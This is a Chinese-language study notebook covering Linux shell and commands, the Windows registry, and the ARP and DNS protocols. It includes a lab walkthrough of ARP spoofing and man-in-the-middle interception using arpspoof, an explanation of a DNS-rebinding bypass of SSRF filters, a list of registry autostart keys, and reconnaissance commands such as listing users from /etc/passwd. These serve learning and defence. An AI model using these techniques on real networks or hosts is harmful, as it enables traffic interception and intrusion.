目的是为了区分数字名字的文件和文件描述符，如果没有& 系统会认为是将文件描述符重定向到了一个数字作为文件名的文件，而不是一个文件描述符 [root@izwz99bgx9y93dmv0mir0ez study]# ls &> file [root@izwz99bgx9y93dmv0mir0ez study]# cat file errorlog file rightlog [root@izwz99bgx9y93dmv0mir0ez study]# dasdasd &>> file [root@izwz99bgx9y93dmv0mir0ez study]# cat file errorlog file rightlog -bash: dasdasd: command not found 注意点 顺序不能更改 cmd > file 2>&1 → `cmd 2>&1 > file 结果是标准输出和标准错误输出不是指向同一个文件。 输入重定向 标准输入重定向 将文件内容重定向到命令中，即将标准输入文件描述符0指向文件。 [root@izwz99bgx9y93dmv0mir0ez ~]# cat file /root [root@izwz99bgx9y93dmv0mir0ez ~]# ls 内联输入重定向 这种方法无需使用文件进行重定向，只需要在命令行中指定用于输入重定向的数据就可以了。 [root@izwz99bgx9y93dmv0mir0ez ~]# cat a heredoc> b heredoc> c heredoc> flag a b c 指定一个文本标记（任何字符串都可作为文本标记，我这里是flag），来划分输入数据的开始和结尾。 所以cat的输出为a,b,c /dev/null文件 /dev/null 是一个特殊的文件，写入到它的内容都会被丢弃；如果尝试从该文件读取内容，那么什么也读不到。但是 /dev/null 文件非常有用，将命令的输出重定向到它，会起到\"禁止输出\"的效果。 运算符 数学运算 expr ┌──(khaz㉿kali)-[~] └─$ a=2 b=1 ┌──(khaz㉿kali)-[~] └─$ echo `expr $a+$b` 2+1 ┌──(khaz㉿kali)-[~] └─$ echo `expr $a + $b` 3 注意：变量和运算符之间要用空格隔开才可以。运算表达式要用反引号包围。 IF语句 条件表达式 最好用[[ ]]，并注意间隔 if [[ condition1 ]] then command1 elif condition2 then command2 else commandN fi if condition1; then command1; elif condition2; then command2; else commandN;fi; 需要注意的是在shell中0表示True，其他的表示False（命令执行状态） ┌──(khaz㉿kali)-[~/桌面] └─$ if [[ 0 ]] then echo 0 is true fi >>0 is true 在bash和unix shell中，返回值通常不是布尔值。它们是整数退出代码，用来判断代码是否执行成功。 如果0是错误的，那么程序只能显示一种错误。 如果0是正确的，那么任何非零值都是错误的，我们就可以使用1-255之间的任何数字来表示错误。这意味着我们可以有许多不同类型的错误。 例如1是一个一般性错误，126表示文件无法执行，127表示“找不到命令”，等等。 ┌──(khaz㉿kali)-[~/桌面] └─$ ls 1.sh 2.sh ctf fpm.py sstilabs-master test.sh ┌──(khaz㉿kali)-[~/桌面] └─$ echo $! #$!保存最后一条命令执行的退出状态码 0 FOR语句 bash下 for ((i=1;i #!/bin/bash echo \"-- \\$* 演示 ---\" for i in \"$*\"; do echo $i done echo \"-- \\$@ 演示 ---\" for i in \"$@\"; do echo $i done while语句 #!/bin/bash count=1 while [ \"$count\" -le 10 ] do echo $count count=$(($count+1)) done shell统计当前文件夹下的文件个数、目录个数 https://blog.csdn.net/weixin_44203158/article/details/109727981 sort https://blog.csdn.net/linggang_123/article/details/118552536 grep 在/etc/目录下寻找文件里包含mysql字符的文件，并打印其文件名。 grep -rl 'mysql' /etc -r：递归查找 -l：只打印文件名 sed s模式---字符替换 ┌──(khaz㉿kali)-[~/桌面] └─$ cat data The quick brown fox jumps over the lazy dog. The quick brown fox jumps over the lazy dog. The quick brown fox jumps over the lazy dog. The quick brown fox jumps over the lazy dog. ┌──(khaz㉿kali)-[~/桌面] └─$ sed 's/dog/cat/' data The quick brown fox jumps over the lazy cat. The quick brown fox jumps over the lazy cat. The quick brown fox jumps over the lazy cat. The quick brown fox jumps over the lazy cat. ┌──(khaz㉿kali)-[~/桌面] └─$ cat data The quick brown fox jumps over the lazy dog. The quick brown fox jumps over the lazy dog. The quick brown fox jumps over the lazy dog. The quick brown fox jumps over the lazy dog. sed编辑器并不会修改文本文件的数据。它只会将修改后的数据发送到STDOUT。如果你查看原来的文本文件，它仍然保留着原始数据。 将sed结果重定向到其他文件即可。 参数 -e 多条sed命令执行 sed -e 's/brown/green/; s/dog/cat/' data1.txt 参数 -f sed -f script1.sed data1.txt 实现了sed -e 's/brown/green/; s/dog/cat/' data1.txt script1.sed s/brown/green/ s/dog/cat/ -n 不产生输出 awk 这个命令主要的作用就相当于split，format，字符串分割，格式化 输出所有用户 cat /etc/passwd | awk -F ':' '{print $1}' awk -F指定域分隔符为':'，将记录按指定的域分隔符划分域，填充域，$0则表示所有域,$1表示第一个域,$n表示第n个域。 默认分隔符为空格 $IFS 类似于python的.split()方法 $IFS内部域分隔符,默认为空格/Tab/换行 也可以指定IFS的值，将值替换为空格/Tab/换行 string=\"k?haz\" IFS='?' echo $string >>k haz Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2023-10-08 11:08:39 "},"07.基础知识/Linux/Linux命令.html":{"url":"07.基础知识/Linux/Linux命令.html","title":"Linux常用命令","keywords":"","body":"Linux一切皆文件 没有信息就是好消息，说明命令成功了。 查看系统信息 uname -a 后台运行程序 后台运行 nohup cmd & # 输出会重定向到nohup.out中或者nohup cmd >hello.log & 指定输出到hello.log中 yum install screen # 安装 screen -S [$Name] # 创建窗口 screen cmd # 在窗口中执行命令 screen -ls # 列出窗口 screen -r [$Name] # 再次连接ssh时恢复会话 查看后台程序 jobs -l # 列出 kill %num # 杀死后台作业 文件 创建文件 vi /vim filename：文本编辑器 touch filename：创建空文件 重定向创建 echo \"string\" > filename cat > filename：输入文件内容，ctrl+d保存并退出 复制文件/目录 cp file_path xx 当xx为文件时，即创建file的副本xx 当xx为目录时，即将file复制到xx目录下 可选参数：-R 复制文件夹 文件链接 软链接/符号链接 ln -s 源文件名 快捷方式名（软连接，只是创建了一个快捷方式） 硬链接 ln 源文件名 文件名（硬链接，两个文件是同步的，就是对任意一个操作，都会影响到两个） 二者区别 删除了源文件，软连接就失效了，而硬链接相当于副本，不受影响。 重命名文件/目录 在Linux中，重命名文件称为移动（moving） mv name1 name2：更改文件名/目录名 mv name dir_path：移动文件/目录 mv file_path dir_path+file_name2：移动文件并重命名 删除文件 在Linux中，删除（deleting）叫作移除（removing）。 rm filename -i：删除前询问 -f：强制删除 读取文件 命令 作用 可选参数 cat/tac 从头到尾显示文件内容（tac相反） -n：显示行号 head/tail 读取前/后lines行 --lines=？ nl 显示行号和内容 sort 排序文件内容并显示 more 分页显示文件内容 uniq 去重后，显示文件内容 less 一次显示一屏的文件文本 paste 可以将两个文本按列拼接到一起显示 strings 读取二进制文件（cat不能读取二进制） 搜索文件内容 grep string filename ：在file中查找匹配string的内容 参数： 功能 例子 -v 反向搜索 grep -v t file1 -n 显示行号 grep -n t file1 -e 多个匹配模式 grep -e t -e f file1：匹配t和f字符 正则 查看文件类型/状态 file filename stat filename 解压缩文件 赋予文件权限 chmod +rw filename tar 解包：tar xvf FileName.tar 打包：tar cvf FileName.tar DirName （注：tar是打包，不是压缩！） 文件权限 理解权限 [root@izwz99bgx9y93dmv0mir0ez ~]# ls -l total 16 -rwxrwxr-x 1 rich rich 4882 2010-09-18 13:58 myprog .... -rwxrwxr-x解读为-，rwx，rwx，r-x 第一个字符 | 字符 | 含义 | | :--: | :------------: | | - | 代表文件 | | d | 代表目录 | | l | 代表链接 | | c | 代表字符型设备 | | b | 代表块设备 | | n | n代表网络设备 | 后面9个字符，每三个为一组 | 字符 | 含义 | 每一组对应的安全级别 | | :--: | :----------------: | :------------------: | | r | 代表对象是可读的 | 文件属主的权限 | | w | 代表对象是可写的 | 属主成员的权限 | | x | 代表对象是可执行的 | 其他用户的权限 | 若没有某种权限，在该权限位会出现单破折线。 属主成员指的是与文件属主在同一个用户组的成员 其他用户指的是与文件属主不在同一个用户组的成员 改变权限 chmod 八进制法 sudo chmod 777 filename 777由上图可知是赋予全部权限 设置默认权限 umask 文件权限=777-umask=755 目录 查看目录下的文件 ls 可选参数 功能 -l 查看详细信息 -a 显示所有文件（包括隐藏文件） -R 展示当前目录下的所有子目录和文件 -i 展示文件的索引节点 -F 展示文件类型 -F 目录后加上/ 可执行文件后加上* dir vdir 等价于 ls -l 查看目录结构 tree dir 创建目录 mkdir dir_name：创建单个目录 mkdir dir1/dir2/dir3：创建多个目录 删除目录 rmdir dir_name：删除空目录 rm -rf dir_name：删除非空目录 不使用-f参数的话，需要一一确定是否删除子目录和文件 更安全，但是更麻烦 切换到某个目录 cd dir_path 显示当前所在目录 pwd 进程--process 查看进程 ps 显示了程序的进程ID（Process ID，PID），它们运行在哪个终端（TTY），以及进程已用的CPU时间。 ps -ef ps -aux | grep apache # 与grep联用查找apache进程 -A 显示所有进程 a 显示所有进程 -a 显示同一终端下所有进程 c 显示进程真实名称 e 显示环境变量 f 显示进程间的关系 r 显示当前终端运行的进程 -aux 显示所有包含其它使用的进程 top 与ps不同的点在于，ps只能显示一个时间点的进程信息，而top是实时更新，就像windows的任务管理器。 交互命令：输入q退出top命令。 lsof lsof -p pid //查看进程打开了哪些文件 结束进程 在Linux中，进程之间通过信号来通信。 kill pid：通过进程的pid来结束进程 kill -9 pid：强制结束 killall process_name：通过进程名结束进程（支持通配符） killall http* 上面的命令结束了所有以http开头的进程 用户 切换用户 su - 用户名 高权限切换低权限无需密码，反之需要。 查看第一次登录到系统的用户 who am i 特殊符号 功能 # 注释后面的命令 ； 依次执行命令 \\ 管道，前一个命令的输出作为后一个命令的输入 \\ \\ 如果前一条命令执行不成功则执行下一条命令 & 后台执行命令 && 如果前一条命令执行成功则执行下一条命令 $? 存储上一条命令的执行结果 网络 查看ip ip address show ifconfig 抓取服务流量 sudo tcpdump -i lo port 6379 -w redis.pcapng 查找命令 find # 查找可写目录 find / -type d -writable locate #更新索引数据库 sudo updatedb 端口 端口是通过端口号来标记的，端口号只有整数，范围是从0~65535 https://www.runoob.com/w3cnote/linux-check-port-usage.html lsof lsof -i:8000 //查看8000端口占用情况 netstat netstat -ntlp //查看当前所有tcp端口 netstat -ntulp | grep 80 //查看所有80端口使用情况 netstat -ntulp | grep 3306 //查看所有3306端口使用情况 服务 systemctl command 服务 command mean status 查看服务状态 start 启动服务 restart 重启服务 stop 停止服务 enable 开机自启服务 disable 取消开机自启服务 reload:不关闭unit的情况下,重新载入配置文件,让设置生效。 is- active:目前有没有正在运行中。 is- enabled:开机时有没有默认要启用这个unit。 kill:不要被kill这个名字吓着了,它其实是向运行unit的进程发送信号 show:列出unit的配置。 mask:禁用服务 unmask:取消对服务的禁用 list-unit-files|grep enable:列出所有自启动服务 loaded：开机是否自启动，enabled说明是自启动的 active：现在是否启动，active（running)说明正在 使用技巧 为命令起别名 alias命令是另一个shell的内建命令。命令别名允许你为常用的命令（及其参数）创建另一 个名称，从而将输入量减少到最低。 alias 别名='原命令' 下面为展示隐藏文件的ls命令起别名la [root@izwz99bgx9y93dmv0mir0ez ~]# alias la='ls -a' [root@izwz99bgx9y93dmv0mir0ez ~]# la . .. .bash_history .bash_logout .bash_profile .bashrc .cache .cshrc H1ve .pip .pki .pydistutils.cfg .ssh .tcshrc .viminfo web 注意命令别名属于内部命令，一个别名仅在它所被定义的shell进程中才有效。 可以通过在~/.bashrc文件内编写，已达到永久生效的效果 执行历史命令 先用history命令查看历史命令记录，再用！+ 命令编号执行历史命令。 Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2023-11-16 16:48:56 "},"07.基础知识/Linux/Linux命令本质.html":{"url":"07.基础知识/Linux/Linux命令本质.html","title":"Linux命令本质","keywords":"","body":"命令本质 命令实际上就是具有一定功能的二进制文件 命令位置 /bin,/usr/bin，默认都是全体用户使用 /sbin,/usr/sbin,默认root用户使用 执行过程 命令分类--外部和内建 内建命令实际上是shell程序的一部分，简单快速系统bash内置源码 比如：exit，history，cd，echo等。 外部命令是linux系统中的实用程序部分，外部命令的实体并不包含在shell中，但是其命令执行过程是由shell程序控制的。外部命令是在bash之外额外安装的，通常放在/bin，/usr/bin，/sbin，/usr/sbin等 查看外部命令存储位置 echo $PATH 注：这里的PATH就是经常提到的环境变量 当用户执行的是外部命令时，系统会在指定的多个路径中查找command的可执行文件，而定义这些路径的变量，就称为 PATH 环境变量，其作用就是告诉 Shell 待执行命令的可执行文件可能存放的位置，Shell 会在 PATH 变量包含的多个路径中逐个查找，直到找到为止（如果找不到，Shell 会提供用户“找不到此命令”）。 判断命令是否为外部还是内建命令 type command [root@izwz99bgx9y93dmv0mir0ez ~]# type cd cd is a shell builtin [root@izwz99bgx9y93dmv0mir0ez ~]# type vim vim is /usr/bin/vim [root@izwz99bgx9y93dmv0mir0ez ~]# type ps ps is hashed (/usr/bin/ps) 区别 外部命令 当外部命令执行时，会创建出一个子进程。这种操作被称为衍生（forking）。外部命令ps很方便显示出它的父进程以及自己所对应的衍生子进程。 [root@izwz99bgx9y93dmv0mir0ez ~]# ps -f UID PID PPID C STIME TTY TIME CMD root 8986 8984 0 17:17 pts/0 00:00:00 -bash root 9054 8986 0 17:53 pts/0 00:00:00 ps -f ps进程的PPID为-bash的PID。 内建命令 内建命令和外部命令的区别在于前者不需要使用子进程来执行。 因为既不需要通过衍生出子进程来执行，也不需要打开程序文件，内建命令的执行速度要更 快，效率也更高。 有些命令有多种实现方式 [root@izwz99bgx9y93dmv0mir0ez ~]# type -a cd cd is a shell builtin cd is /usr/bin/cd 对于有多种实现的命令，如果想要使用其外部命令实现，直接指明对应的文件就可以了。 例如，要使用外部命令pwd，可以输入/bin/pwd。 Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2023-10-27 17:07:00 "},"07.基础知识/Windows/windows基本操作.html":{"url":"07.基础知识/Windows/windows基本操作.html","title":"windows基本操作","keywords":"","body":"Windows注册表 1、定义 注册表： Windows操作系统称之为登录档案。是Microsoft Windows中的一个重要的数据库，注册表是 windows操作系统中的一个核心数据库，其中存放着各种参数，直接控制着Windows的启动、硬件驱动程序的 装载以及一些Windows应用程序的运行，从而在整个系统中起着核心作用。这些作用包括了软、硬件的相关配置和状态信息，比如注册表中保存有应用程序和资源管理器外壳的初始条件、首选项和卸载数据等，联网计算机的整个系统的设置和各种许可，文件扩展名与应用程序的关联，硬件部件的描述、状态和属性，性能记录和 其他底层的系统状态信息，以及其他数据等。注册表中还包含 Windows 在运行期间不断引用的信息，例如，每个用户的配置文件、计算机上安装的应用程序以及每个应用程序可以创建的文档类型、文件夹和应用程序图 标的属性表设置、系统上存在哪些硬件以及正在使用哪些端口。当一个用户准备运行一个应用程序，注册表提 供应用程序信息给操作系统，这样应用程序可以被找到，正确数据文件的位置被规定，其他设置也都可以被使用。 正常情况下，你可以点击开始菜单当中的运行，然后输入regedit或regedit.exe点击确定就能打开 Windows操作系统自带的注册表编辑器了，友情慎重提醒，操作注册表有可能造成系统故障，若您是对 Windows注册表不熟悉、不了解或没有经验的Windows操作系统用户建议尽量不要随意操作注册表，即便是必须要操作，那么也要提前做好注册表的备份工作。如果上述打开注册表的方法不能使用，说明你没有管理员权 限，或者注册表被锁定，如果是没有权限，那么想办法解锁权限。 简单来说：注册表是windows系统来记录和修改用户设置的，不论是软件还是硬件。 注册表的数据结构： 注册表由项（也叫主键或称“键”）、子项（子键）和值构成。一个项就是分支中的一个文件夹，而子项就 是这个文件夹当中的子文件夹，子项同样它也是一个项。一个值则是一个项的当前定义，由名称、数据类型以 及分配的值组成。一个项可以有一个或多个值，每个值的名称各不相同，如果一个值的名称为空，则该值为该 项的默认值。 在注册表编辑器（regedit.exe）中，数据结构显示如下，其中，command键是open项的子项，(默 认)表示该值是默认值，值名称为空，其数据类型为REG_SZ，数据值 为%systemroot%/system32/notepad.exe\"%1数据类型。 注册表的数据类型主要有以下四种：显示类型（在编辑器中）数据类型说明 REG_SZ：字符串：文本字符串 REG_MULTI_SZ：多字符串值：含有多个文本值的字符串 REG_BINARY：二进制数：二进制值，以十六进制显示， REG_DWORD：双字值；一个32位的二进制值，显示为8位的十六进制值。 win+r键，运行，输入regedit，即可看到注册表 注册表中关于开机启动项的配置位置在这里 HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run 对于win10来讲的常见位置： HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run 其他位置：这些大致了解即可，后面用到哪个就说哪个。 Load注册键：HKEY_CURRENT_USER＼Software＼Microsoft＼WindowsNT＼CurrentVersion＼ Windows＼load Userinit注册键：HKEY_LOCAL_MACHINE＼SOFTWARE＼Microsoft＼WindowsNT＼ CurrentVersion＼Winlogon＼Userinit这里也能够使系统启动时自动初始化程序。通常该注册键下面有 一个userinit.exe，但这个键允许指定用逗号分隔的多个程序，例如“userinit.exe,OSA.exe”(不含引 号)。 等等.. 命令行添加注册表选项 reg add HKEY_CURRENT_USER\\Software\\Valve\\Half-Life\\Settings /v dms /t REG_SZ /d test /f 注：reg 命令;add 增加; /v 选项; /t 类型 ;/d 值;/f 不用提示就强行覆盖现有注册表项 Window安全组策略 1、定义 百度百科：组策略（英语：Group Policy）是微软Windows NT家族操作系统的一个特性，它可以控制用户 帐户和计算机帐户的工作环境。组策略提供了操作系统、应用程序和活动目录中用户设置的集中化管理和配 置。组策略的其中一个版本名为本地组策略（缩写“LGPO”或“LocalGPO”），这可以在独立且非域的计算机上 管理组策略对象。 通俗解释：组策略是一组策略的集合，策略就是制定的规则。组策略是将系统重要的配置功能汇集成各种配置 模块，供用户直接使用，从而达到方便管理计算机的目的。简单点说，组策略就是修改注册表中的配置。当 然，组策略使用自己更完善的管理组织方法，可以对各种对象中的设置进行统一的管理和配置，远比手工修改 注册表方便、灵活，功能也更加强大 打开本地组策略的方式 win+r键，运行 gpedit.msc Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-11-28 17:27:04 "},"07.基础知识/计算机网络/ARP协议.html":{"url":"07.基础知识/计算机网络/ARP协议.html","title":"ARP协议","keywords":"","body":"ARP协议是什么 ​ ARP 协议是地址解析协议。它的作用是，通过IP地址（身份证号），问出MAC地址（名字）。 ​ 比如说，一个网络，有A、B、C 和 D四个设备，还有一个特殊的设备，它是路由器。每个设备有 IP 地址和 MAC 地址。 假设，设备A 需要发送数据包给设备C，设备A的应用程序只知道要发送数据给10.0.2.6这个ip，但是发不出去。 这是因为，IP地址类似身份证号，在全国范围内，它很好用，但在家庭范围内不灵。MAC类似名字，在全国范围内不灵，但家庭内部，还得靠这个。 ​ 同样，局域网内部通信，也就是通过普通二层交换机通信，IP(身份证号)不灵，得依靠MAC(名字)。A必须知道10.0.2.6的MAC地址，才能将数据包发送出去。然而，设备A怎么知道设备C的MAC呢？这就要依靠 ARP 协议。 ARP协议如何实现 ​ 设备A发送一个广播包，它就是ARP 包，问所有设备： 10.0.2.6(身份证号)是谁的？或许有善于思考的人会问，此时A不知道其他机器的mac地址，怎么发数据包？我回答：广播包是普发，既然普发，当然无需知道接收方的mac地址。 其他设备都不予理睬，设备C知道自己的IP是10.0.2.6，所以，它立即做出回应。 ​ 正常情况下，其他的设备都默不作声，只有设备C，它会发出应答包。善于思考的人此时又会问：C不知道A的mac地址，怎么回应？错：A发送的广播包中带有自己的mac地址，所以，C此时已经有了A的mac地址。回应包就像一张身份证：一行是身份证号ip，下一行是姓名mac。就这样，设备A通过询问，拿到了设备C的MAC，二者就可以在局域网中进行通信了。 这里就出现另一个问题：是不是每发送一次都得经过广播 -> 封装 ARP 响应 -> 返回给主机这一系列流程呢？ ​ 答案是：ARP表 ​ 主机通过把第一次 ARP 获取到的 MAC 地址作为 IP 对 MAC 的映射关系到一个 ARP 缓存表中，下一次再向这个地址发送数据报时就不再需要重新发送 ARP 请求了，而是直接使用这个缓存表中的 MAC 地址进行数据报的发送。 ARP数据包 实验环境：宿主机window10，虚拟机kaii（net连接） 工具：wireshark 选择捕获VMnet8网卡。 在宿主机上ping 192.168.244.128 （ping 虚拟机ip地址），过滤ARP协议得到 可以看到info的信息其实就告诉我们了ARP协议是用来干嘛的。 数据包内容，以ARP请求为例： 第一帧描述了ARP数据包的长度，时间，类型等信息。 第二帧描述了源mac地址和目标mac地址 其中目的地址ff:ff:ff:ff:ff:ff为广播地址 第三帧 引用图片 ARP响应包主要不同点就在于ARP数据包类型以及源，目标地址。 ARP协议探测主机 因为ARP的工作流程，所以可以用来探测主机。 使用netdiscover工具进行探测 netdiscover -r 192.168.244.1/24 下图为另一台虚拟机ubuntu的ip地址 下图为命令执行结果 192.168.244.1为本机 192.168.244.2为VM网关 192.168.244.129为同一局域网下的主机 192.168.244.254为VM？ ARP攻击 欺骗攻击 产生原因 ARP的特性 设备就算没有主动去询问（发广播包），也会接收别人主动发来的身份诊卡（ARP回应包）。 并且接收时不会去判断真假，而是直接保存到ARP表中。 欺骗主机 Victim：虚拟机ububtu正常联网 hacker：kali机使用arpspoof工具进行ARP欺骗攻击 arpspoof -i 网卡名 -t 目标主机 路由器 命令的结果就是让Victim的ARP表中存储的路由器mac地址变为hacker的mac地址，即发送的数据包会到hacker主机，而不是到路由器。 从下图可以看到victim无法访问网站，并且通过命令arp -a查看ARP表会发现VM网关（192.168.244.2）的mac地址和hacker的mac地址是一样的，所以ARP欺骗攻击成功了。 中间人攻击--欺骗网关和主机 ​ 在上面的基础上，hacker还可以再对路由器进行ARP欺骗攻击，让路由器中Victim的ip所对应的MAC地址变为hacker的MAC地址，这样当Victim发送数据包的时候就会先发送到hacker手上，hacker可以把数据包再给路由器，当路由器收到响应的数据包时，就会转发给hacker，这样hacker就能够监控并更改Victim的通信了。 防御 绑定mac地址 使用静态arp缓存表 参考文章 ARP协议 ARP欺骗 Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2023-10-27 17:08:42 "},"07.基础知识/计算机网络/DNS协议.html":{"url":"07.基础知识/计算机网络/DNS协议.html","title":"DNS协议","keywords":"","body":"DNS协议介绍 DNS（Domain Name System）协议位于ISO参考模型的应用层。在ISO参考模型中，应用层是最高层，负责提供网络服务和应用程序之间的接口。 DNS协议的主要功能是将域名解析为IP地址。当用户在浏览器中输入一个域名时，例如\"example.com\"，浏览器会发送一个DNS查询请求到本地DNS服务器。本地DNS服务器通过DNS协议向上级DNS服务器发出请求，逐级查询，直至找到与域名对应的IP地址，并返回给用户的设备。这样，用户可以通过域名来访问互联网上的资源，而不需要记住复杂的IP地址。 DNS协议支持UDP和TCP，端口号为53 域名分类 DNS TTL TTL值全称是“生存时间（Time To Live)”，简单的说它表示DNS记录在DNS服务器上缓存时间，数值越小，修改记录各地生效时间越快。 当各地的DNS(LDNS)服务器接受到解析请求时，就会向域名指定的授权DNS服务器发出解析请求从而获得解析记录；该解析记录会在DNS(LDNS)服务器中保存一段时间，这段时间内如果再接到这个域名的解析请求，DNS服务器将不再向授权DNS服务器发出请求，而是直接返回刚才获得的记录；而这个记录在DNS服务器上保留的时间，就是TTL值。 常见的设置TTL值的场景： • 增大TTL值，以节约域名解析时间 • 减小TTL值，减少更新域名记录时的不可访问时间 浏览器DNS解析流程 因为每次请求时都向DNS服务器发起查询，过于浪费资源，所以出现了DNS缓存。 浏览器DNS查找顺序一般是这样的: 浏览器DNS缓存->本地系统DNS缓存->本地计算机HOSTS文件->路由器DNS缓存->ISP的DNS缓存->根服务器递归搜索 浏览器DNS缓存（内存中) 浏览器会按照一定频率缓存DNS记录 查看google浏览器DNS缓存 本地DNS缓存(内存中) 查看：ipconfig /displaydns 清除：ipconfig /flushdns 本地HOSTS文件 c:\\windows\\system32\\drivers\\etc\\hosts 路由器DNS缓存 路由器DNS被篡改会造成域名劫持，你访问的网址都会被定位到同一个位置，但是IP直接可以访问 ISP的DNS服务器 公共服务器 8.8.8.8 (Google 提供) 114.114.114.114 (国内公共 DNS) 专用服务器 根服务器 以访问www.baidu.com为例， DNS服务器先问根域名服务器.com域名服务器的IP地址，然后再问.com域名服务器，以此类推 设置DNS解析 以阿里云服务器为例 主机记录 就是要解析的域名，比如网站根域名为khaz.top，主机记录@即@khaz.top等价于khaz.top 通常会将加www和不加www的域名都解析到同一个ip上。 记录类型 解析线路 就是选择哪一个ISP的DNS服务器。 记录值 就是域名对应的IP地址。 TTL DNS缓存时间，当修改DNS解析时，需要经过TTL时间才会生效。 问题 当多个域名解析到一个IP时，如果通过IP地址来访问服务器，那么会访问到哪一个域名（网站）呢？ 答案： 虚拟主机技术 实现多个站点在同一台服务器上。 比如服务器使用Apache，那么在Apache的配置文件中加入VirtualHost即可新增虚拟主机 DocumentRoot /var/www/acm ServerName acm.hdu.edu.cn DocumentRoot /var/www/html ServerName www.hdu.edu.cn ServerName对应请求头的HOST字段，DocumentRoot对应的站点目录 这样HOST为acm.hdu.edu.cn时，访问的就是/var/www/acm下的acm.hdu.edu.cn网站 HOST为www.hdu.edu.cn时，访问的就是/var/www/html下的www.hdu.edu.cn网站 虚拟主机技术，也可以实现不同端口对应不同站点，只要修改上面的即可。 反向代理技术 每个站点都在不同的主机上，但都是通过E这个代理服务器进行访问的。 安全相关 DNS欺骗攻击 DNS欺骗攻击（DNS spoofing attack）是一种网络攻击方式，攻击者通过篡改或伪造域名系统（DNS）的解析结果，将用户的请求重定向到恶意网站或进行信息窃取等恶意行为。这种攻击方式可能导致用户被引导到虚假的网站，从而遭受钓鱼诈骗、恶意软件下载、个人信息泄露等风险。 DNS Rebinding 有漏洞的SSRF过滤器执行步骤如下 获取输入的URL，从该URL中提取HOST，如果提取出来的是IP，那么直接跳到第三步； 对该HOST进行DNS解析，获取到解析的IP； 检测该IP是否是合法的，比如是否是私有IP等（是就直接终止流程）； 如果IP检测为合法的，则进入CURL发包； 漏洞点 DNS解析一共分两次，其中第一次是至关重要的有效性检测，第二次则是具体发起的请求。我们利用DNS Rebinding技术，在第一次校验IP的时候返回一个合法的IP，在真实发起请求的时候，返回我们真正想要访问的内网IP即可。 实现方式 同一个域名绑定两条TTL都是0的A记录，不过这样DNS解析是随机的，不够稳定 通过自建DNS服务器，稳定控制解析返回结果 DNS Log ns记录指向自建的DNS服务器，然后当目标主机发起DNS Query时，自建的DNS服务器就记录下该请求。从下图中可以看到向NS服务器发起DNS请求的为用户设置的DNS服务器，这也是为什么查看DNSLog记录的IP不是目标主机的原因。 常用命令 nslookup/dig https://blog.csdn.net/weixin_42426841/article/details/115364502 Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2023-10-27 17:09:32 "},"07.基础知识/计算机网络/湖科大mooc.html":{"url":"07.基础知识/计算机网络/湖科大mooc.html","title":"计算机网络MOOC","keywords":"","body":"第一章 因特网发展的三个阶段 ISP 互联网标准制定 常用的性能指标 速率 现实生活中的“宽带” 因为ISP提供的线路带宽使用的单位是bit，而一般下载软件显示的是字节（1字节＝8比特），所以要通过换算，才能得实际值。 理论上：2M（即2Mb/s）宽带理论速率是：256KB/s（即2048Kb/s），实际速率大约为80--200KB/s； 带宽--发送速率，数据率 吞吐量 实际数据量 时延 指数据（一个报文或分组，甚至比特）从网络（或链路）的一端传送到另一端所需的时间。 组成 信道速率 注意: 以下说法是错误的： “在高速链路（或高带宽链路）上，比特会传送得更快些”。 总时延 = 处理时延 + 排队时延 + 发送时延 + 传播时延 上述方法只是提高了数据的发送速率，减少了传播时延。 时延与网络利用率 例子：假定网络的利用率达到了90%。试估算一下现在的网络时延是它的最小值的多少倍？ D=D0/(1-U)=D0/(1-90%)=10D0;是最小值的10倍; 注：网络时延最小值为网络空闲时的时延D0 时延带宽积--链路上的比特数目 第三章20.假定1km长的CSMA/CD网络的数据率为1Gbit/s。设信号在网络上的传输速率为200000km/s.求能够使用此协议的最短帧长。 答：对于1km电缆，单程传播时间为1/200000=5us，来回路程传播时间为10us，为了能够按照CSMA/CD工作，最小帧的发射时间不能小于10us，以1GB/s速率工作，10us可以发送的比特数等于10*10^-6*10^9=10^4s，因此最短帧是10000位或1250字节长 最短帧长相当于链路上的比特数目 往返时间RTT 表示从发送方发送完数据，到发送方收到来自接收方的确认总共经历的时间。 协议与服务 实体 (entity) ：表示任何可发送或接收信息的硬件或软件进程。 比如说软件进程，网卡 协议：控制两个对等实体进行通信的规则的集合。 对等实体指的是在同一层（对等层）上的实体如上图的A与F就是对等实体。 控制应用层通信的就是HTPP协议等。 三要素 语法：确定通信双方\"如何讲\"，定义了数据格式，编码和信号电平等。 语义：确定通信双方\"讲什么\"，定义了用于协调同步和差错处理等控制信息。 同步：确定通信双方\"讲话的次序\"，定义了速度匹配和排序等。 协议与服务 二者是相互依存的。（注意最底层物理层的不同之处。） 要实现本层协议，需要使用下层所提供的服务（通过服务原语获得） 在协议的控制下，两个对等实体间的通信使得本层能够向上一层提供服务。 所以协议是“水平的”，服务是“垂直的”，实体看得见相邻下层所提供的服务，但并不知道实现该服务的具体协议。也就是说，下面的协议对上面的实体是\"透明\"的。 SDU 层与层之间交换的数据的单位称为服务数据单元 SDU PDU 对等层次之间传送的数据包称为该层的协议数据单元。 服务访问点 在同一系统中相邻两层的实体交换信息的逻辑接口，用于区分不同的服务类型。 数据链路层的服务访问点为帧的“类型”字段。 网络层的服务访问点为IP数据报首部中的“协议字段”。运输层的服务访问点为“端口号”。 计算机网络体系结构 复用和分用 一般来说，应用层会有比较多的进程同时在运行，同时和外部网络有数据的交互，就好比一条道路有多个车道有车辆在行驶。 可是在底层，数据传输是串行的，也就是单车道。 当多车道的车要经过单车道，采取的方法是在单车道入口设立卡子，每个车道的车在卡子前排队，依次通过卡子进入单车道。 排队的过程就是复用（多 → 一），反之就是分用或者叫解复用（一 → 多） 第二章 物理层基本概念 作用 在连接各种计算机的传输媒体上传输数据比特流。 注意：传输媒体不属于计算机网络体系结构（网络体系结构：网络各层及其协议的集合），相当于第0层即物理层的下一层。 特点 机械特性 指明传输媒体的各种规格 电气特性 指明接口电缆上的电压范围 功能特性 